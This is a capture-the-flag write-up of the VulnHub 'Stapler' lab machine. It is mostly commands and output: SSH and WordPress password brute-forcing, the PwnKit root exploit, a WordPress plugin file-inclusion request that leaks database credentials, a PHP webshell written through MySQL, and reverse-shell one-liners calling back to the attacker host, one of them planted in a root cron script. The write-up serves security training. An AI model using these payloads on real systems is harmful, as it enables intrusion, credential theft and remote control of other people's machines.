# Stapler - VulnHub Writeup (EN)

### Lab Overview

Stapler is a Boot-to-Root machine on VulnHub, created by security professional g0tmi1k for the 2016 BsidesLondon conference.

While most machines start with limited user access and have root access as the sole objective, Stapler offers at least 2 different entry points and at least 3 separate privilege escalation methods.

This makes it an ideal machine for developing the multi-vector attack skills that are critical in real-world engagements.

---

### Entry Point - 1

To begin, nmap was run to identify open hosts and ports.

**Host Scan:**

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ nmap -p- --min-rate 3000 -Pn 192.168.122.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-17 08:03 PST
Nmap scan report for 192.168.122.179
Host is up (0.00022s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE  SERVICE
20/tcp    closed ftp-data
21/tcp    open   ftp
22/tcp    open   ssh
53/tcp    open   domain
80/tcp    open   http
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
666/tcp   open   doom
3306/tcp  open   mysql
12380/tcp open   unknown
MAC Address: 52:54:00:40:B9:14 (QEMU virtual NIC)

Nmap scan report for 192.168.122.1
Host is up (0.0000060s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain

Nmap done: 256 IP addresses (2 hosts up) scanned in 45.12 seconds

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

**Port Scan:**

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ nmap -p 20,21,22,53,80,123,137,138,139,666,3306,12380 --min-rate 3000 -A -Pn 192.168.122.179
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-17 13:27 PST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 37.50% done; ETC: 13:27 (0:00:10 remaining)
Nmap scan report for 192.168.122.179
Host is up (0.00052s latency).

PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.122.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   pkzip-file  .ZIP file
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 53.44 seconds

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

The port scan revealed that anonymous FTP login was enabled. Connecting to the FTP server, the username **Harry** was found via banner grabbing, and the username **Elly** was found in a note file.

No other useful information was found, so enum4linux was used to enumerate further system information.

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ enum4linux -a 192.168.122.179
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Apr 17 14:19:58 2026

 =========================================( Target Information )=========================================

Target ........... 192.168.122.179
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ==========================( Enumerating Workgroup/Domain on 192.168.122.179 )==========================

[+] Got domain/workgroup name: WORKGROUP

 ==============================( Nbtstat Information for 192.168.122.179 )==============================

Looking up status of 192.168.122.179
        RED             <00> -         H <ACTIVE>  Workstation Service
        RED             <03> -         H <ACTIVE>  Messenger Service
        RED             <20> -         H <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         H <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> H <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ================================( Share Enumeration on 192.168.122.179 )================================

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

//192.168.122.179/kathy Mapping: OK Listing: OK Writing: N/A
//192.168.122.179/tmp   Mapping: OK Listing: OK Writing: N/A

 ==========================( Password Policy Information for 192.168.122.179 )==========================

        [+] Minimum password length: 5
        [+] Password Complexity Flags: 000000
        Password Complexity: Disabled
        Minimum Password Length: 5

 =================( Users on 192.168.122.179 via RID cycling (RIDS: 500-550,1000-1050) )=================

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)

enum4linux complete on Fri Apr 17 14:20:13 2026

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

Enumeration revealed a username (Fred) in a share comment, along with the password policy and a full user list.

Since the nmap scan also confirmed anonymous SMB login was possible (`account_used: guest`), the SMB server was explored further.

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ smbclient //192.168.122.179/kathy -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun  4 00:52:52 2016
  ..                                  D        0  Tue Jun  7 05:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 23:02:27 2016
  backup                              D        0  Sun Jun  5 23:04:14 2016

                19478204 blocks of size 1024. 16395740 blocks available
smb: \> cd kathy_stuff
smb: \kathy_stuff\> ls
  .                                   D        0  Sun Jun  5 23:02:27 2016
  ..                                  D        0  Sat Jun  4 00:52:52 2016
  todo-list.txt                       N       64  Sun Jun  5 23:02:27 2016

                19478204 blocks of size 1024. 16395740 blocks available
smb: \kathy_stuff\> get todo-list.txt
getting file \kathy_stuff\todo-list.txt of size 64 as todo-list.txt (12.5 KiloBytes/sec) (average 12.5 KiloBytes/sec)
smb: \kathy_stuff\> !cat todo-list.txt
I'm making sure to backup anything important for Initech, Kathy
smb: \kathy_stuff\> cd ..
smb: \> cd backup
smb: \backup\>
smb: \backup\> ls
  .                                   D        0  Sun Jun  5 23:04:14 2016
  ..                                  D        0  Sat Jun  4 00:52:52 2016
  vsftpd.conf                         N     5961  Sun Jun  5 23:03:45 2016
  wordpress-4.tar.gz                  N  6321767  Tue Apr 28 01:14:46 2015

                19478204 blocks of size 1024. 16395740 blocks available
smb: \backup\> get vsftpd.conf
getting file \backup\vsftpd.conf of size 5961 as vsftpd.conf (149.3 KiloBytes/sec) (average 63706.0 KiloBytes/sec)
smb: \backup\> !cat vsftpd.conf
...
chroot_local_user=YES
userlist_enable=YES
local_root=/etc
...
pasv_enable=no
smb: \backup\>
```

The SMB share contained the FTP server configuration file (`vsftpd.conf`), which revealed that `local_root` was set to `/etc`. This means that even a user with local credentials can access the `/etc` directory via FTP, making the system highly vulnerable to further attacks.

Next, the collected user list was used to brute-force the SSH server.

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt ssh://192.168.122.179 -t 30
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-18 21:47:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 7860 login tries (l:30/p:262), ~262 tries per task
[DATA] attacking ssh://192.168.122.179:22/
[STATUS] 296.00 tries/min, 296 tries in 00:01h, 7581 to do in 00:26h, 13 active
[22][ssh] host: 192.168.122.179   login: MFrei   password: letmein
[22][ssh] host: 192.168.122.179   login: CJoo   password: summer2017
[22][ssh] host: 192.168.122.179   login: Drew   password: qwerty
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-18 22:20:10

┌──(jaejun835㉿jaejun835)-[~]
└─$ ssh MFrei@192.168.122.179
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
MFrei@192.168.122.179's password:
Welcome back!

MFrei@red:~$
```

The SSH brute-force was successful, yielding valid credentials and shell access.

After gaining access, SUID binaries were enumerated. The `pkexec` binary was found to have the SUID bit set.

`pkexec` is affected by **CVE-2021-4034 (PwnKit)**, a well-known local privilege escalation vulnerability that allows a regular user to gain root access.

The PwnKit exploit binary was transferred to the target via `scp` and executed to obtain root.

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ git clone https://github.com/ly4k/PwnKit
cd PwnKit
Cloning into 'PwnKit'...
remote: Enumerating objects: 46, done.
remote: Counting objects: 100% (2/2), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 46 (delta 0), reused 0 (delta 0), pack-reused 44 (from 1)
Receiving objects: 100% (46/46), 580.57 KiB | 2.02 MiB/s, done.
Resolving deltas: 100% (15/15), done.

┌──(jaejun835㉿jaejun835)-[~/PwnKit]
└─$ scp PwnKit32 MFrei@192.168.122.179:/tmp/
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
MFrei@192.168.122.179's password:
PwnKit32                                        100%   16KB  32.8MB/s   00:00

┌──(jaejun835㉿jaejun835)-[~/PwnKit]
└─$
```

```
MFrei@red:~$ cd /tmp
MFrei@red:/tmp$ chmod +x PwnKit32
MFrei@red:/tmp$ ./PwnKit32
root@red:/tmp# cat /root/flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

root@red:/tmp#
```

Root access was successfully obtained.

---

## Entry Point - 2

From the earlier port scan, port 80 and port 12380 were identified as running web services.

Attempting to connect to port 80 returned only a "Not Found" page with no useful information.

Port 12380 was running over HTTPS, and accessing it returned an "Internal Index Page!" message.

Gobuster was run against this port to enumerate hidden directories.

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ gobuster dir -u https://192.168.122.179:12380 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.122.179:12380
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 333] [--> https://192.168.122.179:12380/javascript/]
/phpmyadmin           (Status: 301) [Size: 333] [--> https://192.168.122.179:12380/phpmyadmin/]
/announcements        (Status: 301) [Size: 336] [--> https://192.168.122.179:12380/announcements/]
/server-status        (Status: 403) [Size: 306]
Progress: 29999 / 29999 (100.00%)
===============================================================
Finished
===============================================================

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

Checking `robots.txt` revealed that `/admin112233/` and `/blogblog/` were listed under Disallow.

![robots.txt](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/VulnHub/Stapler/image(10).png)

While the Disallow entries in `robots.txt` are intended to prevent search engine crawlers from indexing certain paths, they inadvertently expose hidden directories to anyone who reads the file.

Accessing `/blogblog/` confirmed a WordPress blog was running. wpscan was run against it to gather more information.

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ wpscan --url https://192.168.122.179:12380/blogblog --disable-tls-checks -e u,ap,at,tt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://192.168.122.179:12380/blogblog/ [192.168.122.179]
[+] Started: Thu Apr 23 14:11:54 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.18 (Ubuntu)
 |  - Dave: Soemthing doesn't look right here
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://192.168.122.179:12380/blogblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://192.168.122.179:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Found By: Rss Generator (Passive Detection)

[+] WordPress theme in use: bhost
 | Version: 1.2.9 (80% confidence)

[+] Enumerating All Plugins (via Passive Methods)
[i] No plugins Found.

[i] User(s) Identified:

[+] peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
[+] john
[+] elly
[+] barry
[+] heather
[+] garry
[+] harry
[+] scott
[+] kathy
[+] tim

[+] Finished: Thu Apr 23 14:12:43 2026
[+] Elapsed time: 00:00:49

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

The scan revealed that WordPress version 4.2.1 was in use — a significantly outdated version. Additionally, upload directory listing was enabled and XML-RPC was active.

10 user accounts were also identified via enumeration. Using this list, an XML-RPC-based brute-force attack was launched. XML-RPC allows multiple password attempts in a single request, making it considerably faster than the standard `wp-login` method.

```
wpscan --url https://192.168.122.179:12380/blogblog --disable-tls-checks -U users.txt -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc
```

The brute-force yielded 4 valid credentials.

```
harry / monkey
garry / football
scott / cookie
kathy / coolgirl
```

Attempting to log in with these accounts confirmed they were all standard user accounts — access to the Theme Editor and Plugin menus was restricted.

To find another approach, the upload directory listing identified in the wpscan results suggested that directory listing might also be enabled on the plugins directory.

```
https://192.168.122.179:12380/blogblog/wp-content/plugins/
```

![plugins directory listing](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/VulnHub/Stapler/image(11).png)

Directory listing was indeed enabled, exposing the installed plugins. Among them, the `advanced-video-embed-embed-videos-or-playlists` plugin was identified.

Note: In most real-world environments, directory listing would be disabled. In such cases, wpscan can still enumerate plugins using aggressive detection.

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ wpscan --url https://192.168.122.179:12380/blogblog --disable-tls-checks -e ap --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://192.168.122.179:12380/blogblog/ [192.168.122.179]
[+] Started: Mon May  4 07:59:39 2026

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:04 <=====> (119723 / 119723) 100.00% Time: 00:01:04
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] advanced-video-embed-embed-videos-or-playlists
 | Location: https://192.168.122.179:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-10-14T13:52:00.000Z
 | Readme: https://192.168.122.179:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
 | [!] Directory listing is enabled
 | Found By: Known Locations (Aggressive Detection)
 | Version: 1.0 (80% confidence)

[+] shortcode-ui
 | Version: 0.6.2 (100% confidence)

[+] two-factor
 | The version could not be determined.

[+] Finished: Mon May  4 08:00:53 2026
[+] Elapsed time: 00:01:13

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

Version 1.0 of the `advanced-video-embed-embed-videos-or-playlists` plugin is vulnerable to **CVE-2016-1209 (EDB-39646)** — a Local File Inclusion (LFI) vulnerability.

The vulnerability exists because the plugin's `ave_publishPost` AJAX action passes the `thumb` parameter directly to a file path without any validation, allowing unauthenticated users to read arbitrary files on the server.

The following URL request was used to read `wp-config.php`.

```
https://192.168.122.179:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
```

![LFI request result](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/VulnHub/Stapler/image(12).png)

The request caused the plugin to read `wp-config.php` and save its contents as a `.jpeg` file in the `/wp-content/uploads/` directory. Opening this file revealed the database credentials.

![uploads directory](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/VulnHub/Stapler/image(13).png)

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -k https://192.168.122.179:12380/blogblog/wp-content/uploads/1596487826.jpeg
<?php
/**
 * The base configurations of the WordPress.
 */

// ** MySQL settings - You can get this info from your web host ** //
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8mb4');
define('DB_COLLATE', '');

define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');

$table_prefix  = 'wp_';
define('WP_DEBUG', false);
define('WP_HTTP_BLOCK_EXTERNAL', true);

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

```
DB_USER: root
DB_PASSWORD: plbkac
```

Using these credentials, the WordPress user password hashes were extracted directly from MySQL.

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ mysql -u root -pplbkac -h 192.168.122.179 --skip-ssl
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 12
Server version: 5.7.12-0ubuntu1 (Ubuntu)

MySQL [(none)]> use wordpress;
Database changed
MySQL [wordpress]> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
+------------+------------------------------------+
16 rows in set (0.000 sec)

MySQL [wordpress]>
```

Rather than cracking the hashes with john, the admin password was updated directly in the database.

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ mysql -u root -pplbkac -h 192.168.122.179 --skip-ssl
MySQL [(none)]> use wordpress;
Database changed
MySQL [wordpress]> select user_login, user_email from wp_users where ID=1;
+------------+--------------------+
| user_login | user_email         |
+------------+--------------------+
| John       | john@red.localhost |
+------------+--------------------+
1 row in set (0.001 sec)

MySQL [wordpress]> UPDATE wp_users SET user_pass = MD5('hacked123') WHERE user_login = 'John';
Query OK, 1 row affected (0.131 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [wordpress]>
```

Administrator access was successfully obtained.

Attempting to upload a webshell via the plugin upload feature prompted WordPress to request FTP credentials, blocking the upload.

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

![FTP credentials required](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/VulnHub/Stapler/image(14).png)

Instead, the previously obtained database credentials were used to connect to MySQL directly and write the webshell to the uploads directory using `SELECT INTO OUTFILE`.

```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ mysql -u root -pplbkac -h 192.168.122.179 --ssl=0 -e "SELECT '<?php echo shell_exec(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/shell.php';"

┌──(jaejun835㉿jaejun835)-[~]
└─$
```

The webshell was confirmed to be working by accessing the following URL.

```
https://192.168.122.179:12380/blogblog/wp-content/uploads/shell.php?cmd=id
```

![webshell working](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/VulnHub/Stapler/image(15).png)

Commands were executing as `www-data`.

Passing a reverse shell command directly via URL would cause the `&` character to be interpreted as a URL parameter delimiter, breaking the command. To work around this, the reverse shell command was saved to a file on Kali and hosted over HTTP, then fetched and executed via the webshell.

```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ echo 'bash -i >& /dev/tcp/192.168.122.1/4444 0>&1' > /tmp/rev.sh
cd /tmp && python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

The webshell was used to make the target download `rev.sh` from Kali.

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -k "https://192.168.122.179:12380/blogblog/wp-content/uploads/shell.php?cmd=wget+http://192.168.122.1/rev.sh+-O+/tmp/rev.sh"
```

A netcat listener was opened and `rev.sh` was executed via the webshell to establish a reverse shell connection.

```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -k "https://192.168.122.179:12380/blogblog/wp-content/uploads/shell.php?cmd=bash+/tmp/rev.sh"
```

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.122.179 49986
bash: cannot set terminal process group (1017): Inappropriate ioctl for device
bash: no job control in this shell
www-data@red:/var/www/https/blogblog/wp-content/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```

With a `www-data` shell obtained, the system was enumerated for privilege escalation. Checking `/etc/cron.d/` revealed that `cron-logrotate.sh` was being executed as root every 5 minutes.

```bash
www-data@red:/var/www/https/blogblog/wp-content/uploads$ cat /etc/cron.d/*
cat /etc/cron.d/*
*/5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh
#
# cron.d/mdadm -- schedules periodic redundancy checks of MD devices
57 0 * * 0 root if [ -x /usr/share/mdadm/checkarray ] && [ $(date +\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron --all --idle --quiet; fi
# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```

Checking the file permissions revealed that `cron-logrotate.sh` was world-writable.

```bash
www-data@red:/var/www/https/blogblog/wp-content/uploads$ ls -la /usr/local/sbin/cron-logrotate.sh
-rwxrwxrwx 1 root root 81 Apr 30 02:55 /usr/local/sbin/cron-logrotate.sh
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```

Since any user could modify a script executed by root, a reverse shell payload was written into the file.

The initial `bash /dev/tcp` method did not work on this box, so the `nc mkfifo` method was used instead.

```bash
www-data@red:/var/www/https/blogblog/wp-content/uploads$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 4444 >/tmp/f' > /usr/local/sbin/cron-logrotate.sh
www-data@red:/var/www/https/blogblog/wp-content/uploads$ cat /usr/local/sbin/cron-logrotate.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 4444 >/tmp/f
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```

A netcat listener was opened on Kali.

```bash
nc -lvnp 4444
```

Within 5 minutes, cron executed the script and a root shell connected back.

```
┌──(jaejun835㉿jaejun835)-[~]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.122.179 44188
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
fix-wordpress.sh
flag.txt
issue
python.sh
wordpress.sql
# cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

#
```

Root access was successfully obtained.
